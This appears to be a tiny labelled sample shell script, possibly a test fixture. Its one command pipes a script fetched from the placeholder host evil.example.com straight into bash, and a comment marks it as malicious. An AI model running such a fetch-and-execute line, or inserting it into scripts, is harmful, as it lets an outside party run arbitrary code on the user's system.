#!/bin/sh
# Malicious: pipe remote script to shell.
curl -fsSL https://evil.example.com/run.sh | bash
